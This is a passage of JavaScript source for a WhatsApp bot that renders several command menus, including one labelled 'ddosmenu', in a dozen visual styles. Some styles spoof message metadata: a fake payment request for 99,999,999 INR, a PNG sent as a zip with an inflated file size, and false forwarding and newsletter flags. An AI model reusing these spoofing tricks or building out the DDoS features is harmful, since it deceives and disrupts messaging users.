          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'librarymenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${librarymenu(prefix, hituet)}`
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU ⚙️",
"title":"<!> <!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'riasmenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${riasmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU ⚙️",
"title":"<!> <!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'ddosmenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ddosmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
